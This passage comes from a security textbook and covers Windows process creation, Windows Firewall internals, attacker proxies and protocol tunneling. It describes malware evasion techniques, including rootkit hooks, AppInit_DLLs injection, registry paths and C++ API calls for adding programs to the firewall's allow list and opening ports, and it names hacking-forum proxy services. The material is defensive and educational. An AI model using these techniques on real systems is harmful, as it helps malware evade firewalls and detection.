Before CreateProcess can create the initial thread, the operating 
system must establish a suitable working environment from the exe­
cutable image. This requires the operating system to construct sev­
eral key data structures such as the Windows EPROCESS38 block, 
the initial memory address space for the executable image, the kernel 
process block (KPROCESS),39 and the program environment block 
(PEB).40 Each of the data structures mentioned plays a key role in the 
execution cycle of a process’s threads and, by extension, the process 
overall. As part of the EPROCESS initialization, the system gives 
the process a process identifier (PID).
[Word Count: 98]

The creation of the address space involves establishing the virtual 
memory for the new executable image. Once established, the operat­
ing system maps the section object containing the executable image 
to the new virtual memory space at the base address specified in the 
header of the image. This establishes the new process’s memory space. 
Upon completion of this task, the operating system maps the ntdll.dll 
DLL into the new virtual memory space.
[Word Count: 72]

At this point, if the system-auditing component of Windows 
tracks the creation of new processes, the operating system generates 
an entry in the Security event log chronicling the existence of the 
new process.
[Word Count: 33]

Finally, CreateProcess registers the new process object with the 
operating system, initiating a series of internal functions responsible 
for the management of the new process. This concludes the initial­
ization and setup of the process object, but additional work remains 
before the process and its initial thread are ready to execute. Exhibit 
1-26 illustrates this step.
[Word Count: 56]

1.2.3.5  Windows Subsystem Post Initialization  With the major-
ity of the process container and initial thread initialized and ready, 
CreateProcess must initialize the Windows subsystem. The Windows 
subsystem is responsible for the interface between the user and the 
kernel spaces. This subsystem establishes the working environment for 
applications by providing support for console windows, graphical user 
interface (GUI) windows, thread and process management services,
[Word Count: 64]

Establish Working Environment for 
Executable Image
[Word Count: 6]

Record Entry in Windows Security 
Event Log
[Word Count: 7]

Register Process Object with 
Operating System
[Word Count: 6]

Exhibit 1-26  Create process object steps.
[Word Count: 6]

and miscellaneous other services. Without a suitable environmental 
subsystem, an application would be unable to function given the lack 
of interface between the application and the kernel.
[Word Count: 27]

The Windows subsystem (via the Csrss.exe process) receives a copy 
of the process and its thread’s handles along with any necessary flags. 
CreateProcess gives the Windows subsystem the PID of the process 
responsible for the call to the CreateProcess function. The Windows 
subsystem in turn allocates a new process block inside the csrss pro-
cess and ties in the necessary scheduling priorities, as defined earlier in 
the CreateProcess procedure, along with a default exception handler. 
The subsystem stores this information internally and registers the new
[Word Count: 85]

Kernel Assigns the Initial Tread 
a Tread ID
[Word Count: 8]

Exhibit 1-27  The initial thread creation phase.
[Word Count: 7]

process object within the list of subsystem-wide processes. The pro­
cess’s initial thread is still in the suspended state at this point, but the 
Windows subsystem activates the application start cursor (the cursor 
with the small hourglass or the circular icon on Vista or later). This 
icon will appear for up to two seconds while waiting for the primary 
thread to engage the GUI of the application. As seen in Exhibit 1-28, 
the subsystem initialization phase requires more steps than the other 
phases detailed thus far.
[Word Count: 86]

1.2.3.6  Initial Thread … Go!  By the end of the subsystem initial­
ization phase, the process has all of the necessary information and 
access control tokens41 required to begin execution. Unless the caller 
of CreateProcess specified the CREATE_SUSPENDED flag set for 
the process, the operating system begins the initial thread to continue 
the last step of the initialization process. The initial thread begins by 
running KiThreadStartup42 to set up the necessary kernel-level attri-
butes such as the interrupt request level (IRQL).43 KiThreadStartup in
[Word Count: 83]

Perform Subsystem 
Speciﬁc Initialization
[Word Count: 4]

Validity of Executable Image is 
Veriﬁed by Operating System
[Word Count: 9]

Inform the Windows Subsystem 
of the Process
[Word Count: 7]

Windows Subsystem Generates a 
Process ID (PID) for the New Process
[Word Count: 11]

Windows Subsystem Generates 
Process Block Inside csrss
[Word Count: 7]

Windows Subsystem Establishes 
Scheduling Priority for New Process
[Word Count: 8]

Windows Subsystem Initiates the 
“Waiting” Cursor Icon
[Word Count: 7]

Exhibit 1-28  The subsystem initialization phase.
[Word Count: 6]

turn calls PspUserThreadStartup, which begins by setting the locale 
ID and processor type in the thread execution block (TEB) specific 
to the executable’s header.
[Word Count: 24]

The function PspUserThreadStartup initializes the system-wide 
stack cookie if it has not done so already. This cookie prevents general 
stack overflow attacks45 by setting a value near the end of a function’s 
stack frame. Before a function returns, the stack cookie’s integrity is 
verified. If the function cannot verify the integrity of the cookie, the 
function generates an exception that the binary must address or allows 
the operating system to terminate the process as a safety precaution. 
Exhibit 1-29 displays the steps required by this phase.
[Word Count: 86]

1.2.3.7  Down to the Final Steps  The system initializes the thread local 
storage (TLS) and fiber local storage (FLS) arrays. The result of this 
is the possible creation of a preemptive thread as defined in the trans­
port layer security (TLS) configuration.
[Word Count: 42]

Once the necessary data structures are established, the system pro-
cesses the import table of the executable image. This table results in 
the various required DLLs loading and their entry points being called. 
For each DLL loaded, the loader passes the entry point function, the 
DLL_PROCESS_ATTACH flag, to indicate to the DLL that a new 
process has loaded it. Exhibit 1-30 details this short phase.
[Word Count: 65]

The CreateProcess function has now initialized the executable 
image, registered the necessary data structures with kernel and the 
Windows subsystem, and loaded the necessary resources to allow 
the initial thread to execute. With this in mind, the system begins 
the execution of the initial thread for the new process. After the
[Word Count: 51]

Initial Tread is Executed by the 
Operating System
[Word Count: 8]

IRQL and Other Kernel-Level 
Attributes Established
[Word Count: 6]

Locale and Process Type Deﬁned in 
the Tread Execution Block (TEB)
[Word Count: 11]

Exhibit 1-29  Execution of the initial thread phase.
[Word Count: 8]

Tread-Local Storage (TLS) and 
Fiber-Local Storage (FLS) Initialized
[Word Count: 8]

Generate Additional Preemptive 
Tread If Necessary for TLS
[Word Count: 8]

Exhibit 1-30  Completion of the process initialization phase.
[Word Count: 8]

process’s thread begins, the separation between the process that called 
CreateProcess and the new process is complete, and CreateProcess 
returns to the caller with the new process’s PID. Exhibit 1-31 shows 
this final phase.
[Word Count: 34]

1.2.3.8  Exploiting Windows Execution for Fun and Profit  Given the vari­
ety of data structures and steps required to generate and execute a process 
(and its threads), there are undoubtedly areas where malicious actors 
may exploit these data structures to hide their nefarious activities. One 
of the most common methods, rootkits, can hide a process by mask­
ing out the process object. The function ZwQuerySystemInformation 
provides information about various system attributes, including the 
list of running processes. When malicious code hooks this function, 
it is possible to prevent the caller from seeing all processes, effectively 
hiding a running malicious executable.
[Word Count: 100]

During the DLL loading phase, the operating system queries a 
registry entry called HKEY_LOCAL_MACHINE\Software\
Microsoft\WindowsNT\CurrentVersion\Windows\AppInit_DLLs 
to determine additional DLLs to load at the start of the new process’s 
initial thread execution. This gives attackers the ability to load their 
own custom DLLs into every running process on victims’ systems 
without the affected process’s binaries explicitly requesting the mali-
cious DLL.
[Word Count: 60]

As described above, the process to take an executable program file 
and turn that file into running code is highly involved. Fortunately, 
the Windows API masks the majority of the operation behind a subset 
of API functions. The encapsulation of the low-level details of process 
creation frees the developer from writing code that could lead to poten-
tially devastating results if done poorly, although accessing functions
[Word Count: 66]

Calling Process and New 
Process are Separated
[Word Count: 7]

CreateProcess Returns PID 
of New Process
[Word Count: 6]

directly still provides plenty of opportunity to construct malicious 
executables. While Windows does attempt to hide the majority of the 
underlying data structures associated with process management, mali­
cious code authors, especially those who develop rootkits, have man­
aged to exploit key aspects of the process management system to hide 
their processes. Sometimes, having a bit more transparency might help 
situations like this. At the very least, additional controls should be in 
place to prevent such tampering from going unnoticed.
[Word Count: 80]

With the release of Windows XP SP2, Microsoft Corporation pro­
vided users with a built-in firewall in hopes of protecting its users 
from network threats. Before this release, to protect themselves from 
network attacks, Windows users had to purchase third-party firewall 
products such as Zone Alarm or Black Ice. Many users did not under­
stand the need for firewall software, and as a result, the users of the 
older Windows operating systems were left largely exposed.
[Word Count: 76]

The Windows Firewall consists of relatively few components:46 a 
network driver, a user interface, and a network service. The core of the 
Windows Firewall is located in the IPNat.sys network driver. This 
driver is responsible for not only the Windows Firewall but also the 
network address translation (NAT) functionality of the operating sys-
tem. The driver registers itself as a “firewall hook driver” to determine 
if the firewall should allow or disallow a connection (inbound or out-
bound). The determination of which connections to allow or disallow 
is derived from the list of approved applications and ports supplied by
[Word Count: 99]

the user through the user interface component. The user interface, as 
seen in Exhibit 1-33, allows the user to define which applications and 
which ports the system allows in and out of the Windows Firewall.
[Word Count: 35]

The Internet Connection Firewall and Internet Connection Sharing 
(ICF/ICS) service handles the translation of the firewall rules from 
the user interface to the IPNat.sys driver. In the event that the ICF/
ICS server shuts down, the firewall functionality of the operating sys­
tem is disabled. This is one way that malicious code can circumvent 
the restrictions imposed by the Windows Firewall.
[Word Count: 61]

A more subtle approach adopted by many malicious code families 
involves adding the offending malicious code to the list of approved 
applications. As seen previously in Exhibit 1-33, the Windows Firewall 
retains a list of applications that the user has approved for network 
access. When the user first engages the Windows Firewall, only a 
very small number of entries are present in the list. In recent Windows
[Word Count: 67]

Malware
Request:
Port 6667
Unsolicited
Request
[Word Count: 6]

Exhibit 1-32  Windows Firewall’s stateful firewall operation.
[Word Count: 7]

Exhibit 1-33  Windows Firewall user interface.
[Word Count: 6]

versions, such as Vista and Server 2008, the user must explicitly enable 
common applications, such as Internet Explorer, for the application to 
have access to the network. For the malicious code author to add the 
malicious code to a list of authorized applications, the author must 
either modify the registry directory or use the Windows API. To add 
itself to the list of Windows Firewall–authorized applications, the 
malicious code adds an entry to the following registry branches:
[Word Count: 77]

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
[Word Count: 1]

Services\SharedAccess\Parameters\FirewallPolicy\
StandardProfile\AuthorizedApplications\List
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
[Word Count: 3]

Services\SharedAccess\Parameters\FirewallPolicy\
DomainProfile\AuthorizedApplications\List
[Word Count: 2]

These branches contain a list of all of the Windows Firewall–
authorized applications in a series of strings that indicate the path to 
the application along with key attributes. The malicious code adds its 
information here as if the application is actually allowed to traverse 
the firewall.
[Word Count: 47]

Windows provides an alternative to directly modifying the regis­
try by providing an API interface47 to modify the Windows Firewall 
directly. Using a few lines of code, as seen in Exhibit 1-35, malicious 
code authors can add their creations to the list of Windows Firewall–
authorized applications. Using the API may reduce the likelihood of 
the malicious code raising suspicion about the victim or tripping anti-
virus solutions that monitor direct registry modifications.
[Word Count: 73]

Adding a program to the authorized programs list only allows the 
malicious code to access the network; it does not allow the malicious 
code to run as a server application. For the Windows Firewall to allow
[Word Count: 36]

Exhibit 1-34  Security alert after disabling the Internet Connection Firewall and Internet 
Connection Sharing (ICF/ICS) service.
[Word Count: 16]

access to incoming network connections, the malicious code author 
must “poke a hole” in the firewall. Much the same way that autho­
rized programs are contained within the registry, the firewall retains 
the list of ports that allow unsolicited network connections in the 
registry under the branches:
[Word Count: 47]

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
[Word Count: 1]

Services\SharedAccess\Parameters\FirewallPolicy\
StandardProfile\GloballyOpenPorts\List
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
[Word Count: 3]

Services\SharedAccess\Parameters\FirewallPolicy\
DomainProfile\GloballyOpenPorts\List
[Word Count: 2]

Windows gives each opened port a set of configuration items defin­
ing the network (or networks) allowed to make connections, the proto-
col of the port (TCP or UDP), and the name of the service running the 
port. Malicious code authors can insert their own port definitions into 
the list to open a hole for the malicious code. For malicious code such 
as Waledac, which can provide HTTP and DNS services on Internet-
facing victims, it is important to disable the Windows Firewall to 
allow the malicious code to provide the necessary services.
[Word Count: 93]

// Retrieve the authorized application collection.
fwProfile->get_AuthorizedApplications(&fwApps);
// Create an instance of an authorized application.
CoCreateInstance(
        __uuidof(NetFwAuthorizedApplication),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwAuthorizedApplication),
        (void**)&fwApp
        );
// Allocate a BSTR for the process image file name.
fwBstrProcessImageFileName = SysAllocString(fwProcessImageFile
Name);
// Set the process image file name.
fwApp->put_ProcessImageFileName(fwBstrProcessImageFileName);
// Allocate a BSTR for the application friendly name.
fwBstrName = SysAllocString(fwName);
// Set the application friendly name.
hr = fwApp->put_Name(fwBstrName);
// Add the application to the collection.
hr = fwApps->Add(fwApp);
[Word Count: 75]

Exhibit 1-35  Programmatically adding a program to the Windows Firewall authorized programs list.
[Word Count: 13]

Waledac, however, does not directly modify the Windows registry. 
Instead, Waledac uses the Windows Firewall API to open firewall 
ports. Exhibit 1-36 illustrates the Microsoft example for program­
matically opening a port in the Windows Firewall.
[Word Count: 36]

Antivirus vendors may detect a modification to the firewall set­
tings of Windows Firewall. When malicious code needs to remain 
stealthy, modifying the Windows Firewall settings to connect to the 
command-and-control (C&C) server may prove problematic. Many 
families of malicious code, notably the BBB group B family from 
2008,48 use programs such as Internet Explorer to circumvent the 
Windows Firewall restrictions.
[Word Count: 61]

As mentioned previously, Windows Vista does not give Internet 
Explorer access to the Internet by default. With the prevalence of 
Internet Explorer, many attackers assume that victims have given 
Internet Explorer access to the Internet by adding the application to 
the Windows Firewall–authorized programs list.
[Word Count: 45]

Windows XP systems, on the other hand, automatically allow 
Internet Explorer network requests to traverse the Windows Firewall, 
regardless of whether or not the user explicitly lists the browser in the 
authorized application list. Attackers can exploit this fact by inject-
ing code into a running Internet Explorer instance. The Windows
[Word Count: 51]

fwProfile->get_GloballyOpenPorts(&fwOpenPorts);
// Create an instance of an open port.
CoCreateInstance(
        __uuidof(NetFwOpenPort),
        NULL,
        CLSCTX_INPROC_SERVER,
        __uuidof(INetFwOpenPort),
        (void**)&fwOpenPort
        );
// Set the port number.
fwOpenPort->put_Port(portNumber);
// Set the IP protocol.
fwOpenPort->put_Protocol(ipProtocol);
// Allocate a BSTR for the friendly name of the port.
fwBstrName = SysAllocString(name);
// Set the friendly name of the port.
fwOpenPort->put_Name(fwBstrName);
// Opens the port and adds it to the collection.
fwOpenPorts->Add(fwOpenPort);
[Word Count: 62]

Exhibit 1-36  Programmatically opening a port through the Windows Firewall.
[Word Count: 10]

Given the fact that the Windows Firewall is little more than soft­
ware running on a potentially infected host, malicious code could 
install additional network drivers to intercept traffic before the 
Windows Firewall can intercede. Using a new network stack, such 
as is done by the Srizbi family of malicious code, quickly defeats the 
Windows Firewall but requires a higher degree of operating system 
knowledge on the part of the malicious code author.
[Word Count: 73]

1.	 “National Information Assurance Glossary,” June 2006, http://www.cnss.
[Word Count: 8]

gov/Assets/pdf/cnssi_4009.pdf.
	
2.	 “State of the Hack: iDefense Explains … Public Key Encryption,” iDe-
[Word Count: 13]

fense Weekly Threat Report, ID# 490870, July 6, 2009.
[Word Count: 9]

3.	 “National Information Assurance Glossary,” June 2006, http://www.cnss.
[Word Count: 8]

gov/Assets/pdf/cnssi_4009.pdf.
	
4.	 “German Enigma Cipher Machine,” June 19, 2009, http://users.telenet.
[Word Count: 10]

be/d.rijmenants/en/enigma.htm.
	
5.	 Ibid.
	
6.	 Photo of rotors, http://users.telenet.be/d.rijmenants/pics/hires-wehr3ro­
[Word Count: 8]

tors.jpg.
	
7.	 “State of the Hack: Basic Cryptography,” iDefense Weekly Threat Report,
	
8.	 Whitfield Diffie and Martin E. Hellman, “New Directions in
[Word Count: 22]

Cryptography,” IEEE Transactions on Information Theory IT-22 
(November 1976): 644–54.
	
9.	 R. L. Rivest, A. Shamir, and L. Adleman, “A Method for Obtaining
[Word Count: 23]

Digital Signatures and Public Key Cryptosystems,” Communications of 
the ACM 21, no. 2 (February 1978): 120–6. 
	 10.	 Example from S. Singh, The Code Book: The Science of Secrecy from Ancient
[Word Count: 30]

Encrypt to Quantum Cryptography (London: Fourth Estate, 1999).
	 11.	 P. 
Mockapetris, 
Network 
Working 
Group 
“Domain 
Names: 
Implementation and Specification,” November 1987, http://www.dns.
net/dnsrd/rfc/rfc1035/rfc1035.html.
	 12.	 DNS Security Extensions, “DNSSEC: DNS Security Extensions:
[Word Count: 31]

Securing the Domain Name System,” 2002–2010, http://www.dnssec.
net.
	 13.	 Frederick Avolio, “Firewalls and Internet Security: The Second Hundred
[Word Count: 18]

(Internet) Years,” Internet Protocol Journal 2, no. 2: http://www.cisco.com/
web/about/ac123/ac147/ac174/ac200/about_cisco_ipj_archive_arti­
cle09186a00800c85ae.html.
	 14.	 Leroy Davis, “OSI Protocol Description,” http://www.interfacebus.com/
[Word Count: 18]

Design_OSI_Stack.html.
	 15.	 “State of the Hack: iDefense Explains ... the Windows Firewall,” iDe­
[Word Count: 13]

fense Weekly Threat Report, ID# 485886, May 4, 2009.
	 16.	 Rusty Russell, “Linux IPCHAINS-HOWTO,” July 4, 2000, http://peo­
[Word Count: 18]

ple.netfilter.org/~rusty/ipchains/HOWTO.html.
	 17.	 Netfilter, “The Netfilter.Org ‘Iptables’ Project,” http://www.netfilter.org/
[Word Count: 8]

projects/iptables/index.html.
	 18.	 Shweta Sinha, “TCP Tutorial,” November 19, http://www.ssfnet.org/
[Word Count: 9]

Exchange/tcp/tcpTutorialNotes.html.
	 19.	 “Understanding Full Virtualization, Paravirtualization, and Hardware
[Word Count: 8]

Assist,” VMware, September 11, 2007, http://www.vmware.com/files/
pdf/VMware_paravirtualization.pdf. 
	 20.	 “Virtualization,” 
Intel, 
Inc., 
http://www.intel.com/technology/
virtualization/.
	 21.	 “AMD Virtualization,” AMD, http://www.amd.com/us/products/tech-
[Word Count: 18]

nologies/virtualization/Pages/virtualization.aspx.
	 22.	 “What Is Xen?” Xen, http://www.xen.org.
	 23.	 “Paravirtualization Option Is Not Disabled for Unsupported Operating
[Word Count: 16]

Systems,” VMWare, http://kb.vmware.com/selfservice/microsites/search.
do?language=en_US&cmd=displayKC&externalId=1003008.
[Word Count: 4]

24.	 Simon Sheppard, “chroot,” SS64, http://ss64.com/bash/chroot.html.
	 25.	 “Free Virtual Private Server Solution,” SWSoft, http://www.freevps.com.
	 26.	 “Using a Jail as a Virtual Machine,” DVL Software Ltd., September 1,
[Word Count: 27]

2009, http://www.freebsddiary.org/jail.php.
	 27.	 Christian Bauer, “What Is Basilisk II?” http://basilisk.cebix.net.
	 28.	 Kostya Kortchinsky, “Cloudburst,” Immunity, Inc., June 2, 2009, http://
[Word Count: 20]

www.blackhat.com/presentations/bh-usa-09/KORTCHINSKY/
BHUSA09-Kortchinsky-Cloudburst-PAPER.pdf.
	 29.	 “Path 
Traversal 
Vulnerability 
in 
VMware’s 
Shared 
Folders 
Implementation,” Core Security Technologies, February 25, 2008, http://
www.coresecurity.com/content/advisory-vmware.
	 30.	 “RFID Chips in Car Keys and Gas Pump Pay Tags Carry Security
[Word Count: 32]

Risks,” http://www.jhu.edu/news_info/news/home05/jan05/rfid.html.
	 31.	YouTube, “Cloning Passport Card RFIDs in Bulk for Less Than
[Word Count: 13]

$250,” http://www.youtube.com/watch?v=9isKnDiJNPk.
	 32.	 Microsoft, “Thread Security and Access Rights (Windows),” http://
[Word Count: 11]

msdn.microsoft.com/en-us/library/ms686769(VS.85).aspx.
	 33.	 Microsoft, “SetWindowsHookEx Function,” April 20, 2009, http://
[Word Count: 9]

msdn.microsoft.com/en-us/library/ms644990(VS.85).aspx. 
	 34.	 “Shatter Attacks: How to Break Windows,” April 20, 2009, http://web.
[Word Count: 12]

archive.org/web/20060115174629/http://security.tombom.co.uk/shat­
ter.html. 
	 35.	 Microsoft, “Interactive Services,” April 20, 2009, http://msdn.micro­
[Word Count: 10]

soft.com/en-us/library/ms683502.aspx; and Microsoft, “Interacting 
with Services,” April 20, 2009, http://blogs.msdn.com/larryosterman/
archive/2005/09/14/466175.aspx.
	 36.	 Microsoft, “Impact of Session 0 Isolation on Services and Drivers in
[Word Count: 23]

Windows Vista,” April 20, 2009, http://www.microsoft.com/whdc/
system/vista/services.mspx; further information on window messag­
ing is available from Microsoft, “Microsoft: Win32 Hooks,” April 20, 
2009, 
http://msdn.microsoft.com/en-us/library/ms997537.aspx; 
and 
Microsoft, “About Message and Message Queues,” April 20, 2009, http://
msdn.microsoft.com/en-us/library/ms644927.aspx.
	 37.	 Microsoft, “Section Objects and Views,” http://msdn.microsoft.com/
[Word Count: 43]

en-us/library/ms796304.aspx.
	 38.	 Microsoft, “EPROCESS,” http://msdn.microsoft.com/en-us/library/
[Word Count: 5]

dd852036.aspx.
	 39.	 Mark Russinovich and David Solomon, with Alex Ionescu, Windows
[Word Count: 11]

Internals, 5th ed. (Redmond, Wash.: Microsoft Press, 2009), 338–9.
	 40.	 Microsoft, “PEB Structure,” http://msdn.microsoft.com/en-us/library/
[Word Count: 14]

aa813706(VS.85).aspx.
	 41.	 “State of the Hack: iDefense Explains…Windows Tokens,” iDefense
[Word Count: 10]

Weekly Threat Report, ID# 486906, June 15, 2009.
	 42.	 ReactOS, “ctxswitch.c,”  http://doxygen.reactos.org/d4/d14/ctxswitch_8c_
[Word Count: 12]

source.html.
	 43.	 Microsoft, “Scheduling, Thread Context and IRQL,” http://msdn.micro-
[Word Count: 9]

44.	 Microsoft, “The Windows Prefetcher,” http://blogs.msdn.com/vancem/
[Word Count: 6]

archive/2007/04/15/the-windows-prefetcher.aspx.
	 45.	 “State of the Hack: iDefense Explains… Stack-Based Buffer Overflows,”
[Word Count: 11]

iDefense Weekly Threat Report, ID# 480099, January 5, 2009.
	 46.	 Mark Russinovich and David Solomon, Windows Internals, 4th ed.
[Word Count: 19]

(Redmond, Wash.: Microsoft Press, 2004), 826.
	 47.	 Microsoft, “Exercising the Firewall Using C++ (Windows),” http://msdn.
[Word Count: 15]

microsoft.com/en-us/library/aa364726(VS.85).aspx.
	 48.	 “New IRS-Themed “Group B” BBB Attack Underway,” iDefense Weekly
[Word Count: 11]

Threat Report, ID# 470366, July 1, 2008.
[Word Count: 7]

75
© 2011 by Taylor & Francis Group, LLC
[Word Count: 9]

2.1  How Hackers Cover Their Tracks (Antiforensics)
[Word Count: 7]

2.1.1  How and Why Attackers Use Proxies
[Word Count: 7]

Masking one’s IP address is a standard practice when conducting 
illicit activities. A well-configured proxy provides robust anonymity 
and does not log activity, thereby frustrating law enforcement efforts 
to identify the original location of the person(s) involved.
[Word Count: 37]

Proxies are useful to attackers in many ways. Most attackers use 
proxies to hide their IP address and, therefore, their true physi-
cal location. In this way, attackers can conduct fraudulent financial 
transactions, launch attacks, or perform other actions with little risk. 
While law enforcement can visit a physical location identified by an 
IP address, attackers that use one (or multiple) proxies across country 
boundaries are more difficult to locate (see Exhibit 2-1). The endpoint 
can only view the last proxy with which it is directly communicating 
and not any of the intermediary proxies or the original location.
[Word Count: 98]

Proxies provide attackers with a way to lower their risks of investi­
gator identification of their true IP address. In the hypothetical attack 
displayed in Exhibit 2-1, the victim’s log file contains only one of the 
many IP addresses that investigators need to locate the attacker.
[Word Count: 46]

Attackers operate free proxies or alter a victim’s proxy settings 
because proxies can serve as a monitoring tool. AnonProxy is one 
example of a malicious proxy that its authors designed to monitor users 
and steal information such as social-networking passwords.1 Since a 
proxy relays traffic, it also has the ability to log and alter sensitive 
pages or information. Attackers must either convince users or install 
malicious code to modify proxy settings themselves.
[Word Count: 72]

Malicious code authors also install local proxies. By altering the 
host’s file or browser configuration to use the proxy, the attacker redi­
rects requests and captures confidential information. Some banking 
Trojans give attackers the ability to proxy requests through the vic­
tim’s browser because conducting fraud from a legitimate user’s IP 
address is less suspicious. Local proxies are more difficult to identify 
because the local proxy does not open any network ports and scanning 
the system will reveal no changes.
[Word Count: 80]

2.1.1.1  Types of Proxies  Proxies are so common that many attackers 
scan the Internet for common listening proxy ports. The most com-
mon proxies listen on TCP port 80 (HTTP proxies), 8000, 8081, 
443, 1080 (SOCKS Proxy), and 3128 (Squid Proxy), and some also 
handle User Datagram Protocol (UDP). Attackers who install custom 
proxies often do not use standard ports but instead use random high
[Word Count: 65]

Exhibit 2-1  Multiple proxies make identifying the true source of an attack difficult.
[Word Count: 13]

ports. Some lightweight proxies are written in scripting languages, 
which run with an HTTP server and are easier for attackers to modify. 
Application proxies require configuration. Some applications either 
do not operate correctly through proxy services because the proxy 
server removes necessary information or cannot satisfy the request. 
Some services like The Onion Router (Tor)2 also give users the ability 
to proxy traffic and hide their original location from victims.
[Word Count: 70]

A virtual private network (VPN) acts as a more versatile proxy and 
supports more security features. Instead of configuring the applica­
tion to use a proxy, users can tunnel all traffic through the VPN. VPN 
services usually support strong authentication and are less likely to 
leak information that could identify the user of a proxy.
[Word Count: 55]

Attackers commonly use free or commercial proxies (e.g., SOCKS 
and VPN) that operators advertise on hacking forums. Attackers may 
prefer these services to public proxies because they advertise anonym­
ity and claim they do not keep logs, unlike Tor, where community 
operators can monitor traffic going through an exit node that it con­
trols. Proxy services that keep logs are a danger to attackers who use 
these services for conducting fraud and can lead to their arrests. Some 
commercial VPN and SOCKS proxy services include
[Word Count: 85]

•	 hxxp://secretsline.net
•	 hxxp://vpn-secure.net
•	 hxxp://thesafety.us
•	 hxxp://5socks.net
•	 hxxp://vpn-service.us
•	 hxxp://vip72.com
•	 hxxps://www.cryptovpn.com
•	 hxxp://www.vipvpn.com
•	 hxxp://openvpn.ru
[Word Count: 18]

Another example of such a service from web-hack.ru shows free 
and commercial proxies that are available (see Exhibit 2-2). Translated 
from Russian, these free Proxy and SOCKS services are updated 
every three hours; users can also purchase proxy access through 
the store. Attackers may prefer proxy services advertised on hack-
ing forums because they are less responsive to abuse requests. For 
example, commercial proxy services like FindNot keep logs of their
[Word Count: 71]

users for a maximum of five days to protect the system from being 
used for abusive purposes, while many of those services advertised 
on hacking forums do not keep any logs. Operating proxy services is 
not illegal because it has legitimate purposes related to anonymity for 
users; however, some commercial proxy services are more willing to 
respond to abuse than others.
[Word Count: 61]

2.1.1.2  Detecting the Use of Proxies  Detecting proxies is difficult and 
not always reliable. Since many malicious code authors install custom 
proxies and use encrypted or custom protocols, it is very difficult to 
detect all proxies. There are techniques to detect common proxies, 
but such techniques are unlikely to be effective against attackers who 
use proxies aggressively.
[Word Count: 57]

Port scanning on corporate networks can identify proxies that listen 
on default ports. Organizations should also monitor changes to proxy 
configuration because such changes could indicate that an attacker 
compromised a host. The registry key at HKCU\Software\Microsoft\
Windows\CurrentVersion\InternetSettings, ProxyServer, controls the 
proxy settings for Internet Explorer. To detect proxies on the network 
with intrusion detection systems (IDSs), organizations may use proxy 
rules available from emergingthreats.net.3 The domain name system 
blacklist (DNSBL) is one example of a blacklist that allows adminis­
trators to block certain proxies.4
[Word Count: 85]

Certain proxies do not proxy all traffic. For instance, a Web appli-
cation can force users to perform unique DNS requests with subdo-
mains (see Exhibit 2-3). The application links the DNS request to 
the user’s IP address and verifies that the HTTP request originates 
from the same IP address. If they are not the same, indicating the use 
of a proxy, the application can determine that the proxy IP address
[Word Count: 71]

Exhibit 2-2  Free and commercial proxies available from web-hack.ru.
[Word Count: 9]

made the HTTP request and that the user’s actual IP address made 
the DNS request. Similarly, some Web plug-ins may query the local 
information rather than using the proxy address. As an example, 
decloak.net is a Metasploit project that uses the following application 
plug-ins to determine the true IP address of a proxy user:
[Word Count: 54]

•	 Word
•	 Java
•	 Flash
•	 QuickTime
•	 iTunes
[Word Count: 10]

Metasploit has even provided an application programming interface 
(API) for website owners to determine the true IP addresses of their 
visitors. iDefense configured a browser to use a proxy and showed that 
the Flash test correctly identified the real IP address because Flash 
does not use Internet Explorer proxy settings.
[Word Count: 50]

More aggressive techniques, such as operating proxies, allow law 
enforcement to determine the source and target of attacks that uti­
lize proxies. While such measures are useful, they are generally very 
difficult to operate because of abuse. Analysts must carefully moni­
tor activity because attacks now originate from proxy nodes and may 
result in illegal or otherwise unwanted activity.
[Word Count: 59]

2.1.1.3  Conclusion  Free and commercial proxies are very numerous 
on the Internet and can use standard protocols and ports. Other prox-
ies are more difficult to identify, and administrators can detect the use 
of proxies through configuration changes, IDSs, or tools like decloak.
net. Attackers who want to hide their locations have resources avail-
able to them. Since it is difficult to detect all proxy users accurately, 
proxy tools and services will continue to be useful for attackers.
[Word Count: 78]

Exhibit 2-3  Certain proxy protocols may provide a way to identify the user of a proxy.
[Word Count: 16]

Most enterprise security controls include strong firewalls, intrusion 
detection systems (IDSs), and user policies, such as proxies and time-
of-day rules that limit the amount and type of traffic generated on 
user networks. Tunneling data through other protocols often bypasses 
these controls and may allow sensitive data to exit the network and 
unwanted data to enter. It is even possible to extend all networks 
through these means without ever triggering an alert or log entry.
[Word Count: 75]

Researchers designed SSH to provide this capability, but it is 
simple to block. The Internet Engineering Task Force Request for
[Word Count: 20]

2.1.2.1  HTTP  HTTP has become the de facto high-level protocol 
on the Internet. As the protocol used for accessing content on the 
World Wide Web, developers adapted it to carry much more than 
just the static text and images of Web pages. It now carries audio and 
video streams, can transfer large files, and can even carry application-
to-application remote procedure calls (RPCs). Its ubiquity and indis-
pensability make it a prime candidate for tunneling operations.
[Word Count: 76]

Referring to Exhibit 2-4, in the case of HTTP and most other tun-
nels, other appropriate software that communicates via the protocol
[Word Count: 22]

Telnet Client
SSH Client
SSH Server
Telent Server
SSH Connection
[Word Count: 10]

Exhibit 2-4  Telnet tunneled over a secure shell (SSH) connection.
[Word Count: 10]

of choice simply replaces the client, server, connection, and data (pay­
load). Exhibit 2-5 shows the syntaxes of an HTTP request and reply 
that illustrate areas of the protocol that can contain discretionary 
information for data transfer.
[Word Count: 37]

on Art of Ping. Commercial solutions also exist that almost make the 
practice appear as legitimate and valid solutions for defeating “restric­
tive” firewalls, such as HTTP Tunnel by netVigilance.9
[Word Count: 30]

HTTPS, which is HTTP secured over a secure socket layer (SSL) 
against eavesdropping and tampering, is no different from HTTP 
except that it makes detection harder. If a malicious actor cannot 
eavesdrop, he or she does not have a chance to detect known signa­
tures of tunnels. Proxies that support HTTPS through a CONNECT 
method may actually make matters far worse, as the CONNECT 
method simply establishes an arbitrary TCP connection that can send 
or receive any data.
[Word Count: 78]

Since there are few small areas where data can be stored, DNS tun-
nels need many packets to transfer large amounts of data and tend to 
be chatty. In most cases, the tunnel client is simple end user software 
that makes many requests for nonexistent hosts (where the host names 
are the encoded payload, such as 0123456789abcdef.badguy.goodguy.
com) on some malicious domain or subdomain (badguy.goodguy.com) 
and expects a payload as the response from the tunnel server. The tunnel
[Word Count: 78]

server is generally a rogue (fake) DNS server where intermediary resolvers 
eventually route the questions. Thus, this setup may require more infra­
structure access than just a simple Web server does because an attacker 
needs to delegate DNS authority to a rogue system. Since the communi-
